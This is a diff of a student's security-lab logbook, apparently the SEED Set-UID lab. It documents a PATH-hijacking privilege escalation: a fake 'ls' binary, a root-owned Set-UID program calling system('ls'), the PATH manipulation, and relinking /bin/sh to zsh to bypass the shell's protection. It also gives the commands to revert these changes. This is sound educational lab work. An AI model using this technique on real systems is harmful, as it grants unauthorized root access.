@@ -199,7 +199,27 @@ After searching for a while, we found out that this is due to a security mechani
 
 ### Task 6: The PATH Environment Variable and Set-UID Programs
 
-First, create a malicious program named `ls.c` in a directory (e.g., `/home/seed`). 
+The goal of this task is to explore how the PATH environment variable can be used to change the execution of Set-UID programs. 
+
+Let's start by creating a new program that calls the system’s `ls` command, as in guid:
+```c
+#include <stdlib.h>
+
+int main()
+{
+    system("ls");
+    return 0;
+}
+```
+> - Program calls the `system()` function to execute the `ls` command, but it doesn't specify the absolute path (`/bin/ls`)  
+> - The system will search for ls using the directories listed in the `PATH`, in order
+
+* Compile this program using the command: `gcc myls.c -o myls`
+* Change the owner of the myls program to root and set it as a Set-UID program with the following commands: `sudo chown root myls` and `sudo chmod 4755 myls`.
+
+> By using `chown` and `chmod 4755`, we can make the `myls` program a Set-UID program owned by root. This means that when a normal user execute this program, it will run with root privileges — potentially leading to a *privilege escalation*.
+
+After this, we can create a malicious program named `ls.c` in a directory (e.g., `/home/seed`). 
 
 ```c
 #include <stdio.h>
@@ -211,48 +231,29 @@ int main()
     system("whoami");
 }
 ```
-Compile the `ls.c` program using the following command:
+> - The idea here is to create a fake `ls` program that does something different from the actual `/bin/ls` command.
+> - So we can replace a legitimate system programm with malicious code.
+> 
+Compile the `ls.c` program using the following command: `gcc ls.c -o ls`.
 
-<p align="center" justify="center">
-  <img src="./assets/logbook_4/compile_bad_ls.png"/>
-</p>
-
-> * The idea here is to create a fake `ls` program that does something different from the actual `/bin/ls` command.
-> * So we can replace a legitimate system programm with malicious code.
-
-Next, create a new program that calls the system’s `ls` command, as in guid:
-
-```c
-#include <stdlib.h>
-
-int main()
-{
-    system("ls");
-    return 0;
-}
-```
-> Program calls the `system()` function to execute the `ls` command, but it doesn't specify the absolute path (`/bin/ls`), the system will search for ls using the directories listed in the `PATH`
-
-* Compile this program using the command: `gcc myls.c -o myls`
-* Change the owner of the myls program to root and set it as a Set-UID program with the following commands: `sudo chown root myls`, `sudo chmod 4755 myls`.
-> By using `chown` and `chmod 4755`, we can make the `myls` program a Set-UID program owned by root. This means that when a normal user execute this program, it will run with root privileges — potentially leading to a *privilege escalation*.
-* Add the directory `/home/seed` to your `PATH` environment variable to ensure the system executes your malicious `ls` program instead of the standard `ls`: `export PATH=/home/seed:$PATH`
-> As `system()` function runs `/bin/sh -c "<command>"` it inherits all environment variables from the calling process, including `PATH`.
-* To prevent shell countermeasures when executing a Set-UID program, run the following command (provided by guid): `sudo ln -sf /bin/zsh /bin/sh`.
+After compiling our custom ls command, we add the directory `/home/seed` to the `PATH` environment variable to ensure the system executes your malicious `ls` program instead of the standard `ls`: `export PATH=/home/seed:$PATH`
+> As `system()` function runs `/bin/sh -c "<command>"` it inherits all environment variables from the calling process, including `PATH`.  
+> **Note**: To prevent shell countermeasures when executing a Set-UID program, run the following command (provided by guid): `sudo ln -sf /bin/zsh /bin/sh`.
 
 <p align="center" justify="center">
   <img src="./assets/logbook_4/myls.png"/>
 </p>
 
-Now, we can test `myls` program by executing:
+Finally, we can test `myls` program by executing `myls`
 
 <p align="center" justify="center">
   <img src="./assets/logbook_4/run_myls.png"/>
 </p>
 
-> The output show `root`, indicating that your malicious program has escalated privileges and is running as root.
+> The output show `root`, indicating that your malicious program has escalated privileges and is running as root.  
+> This means that we were able to execute commands as root, giving us access to everything on the system.
 
-To revert the changes run: `sudo ln -sf /bin/dash /bin/sh` and `export PATH=${PATH#/home/seed:}`.
+After doing this exploit, to revert the changes run: `sudo ln -sf /bin/dash /bin/sh` and `export PATH=${PATH#/home/seed:}`.
 
 <p align="center" justify="center">
   <img src="./assets/logbook_4/revert_changes.png"/>
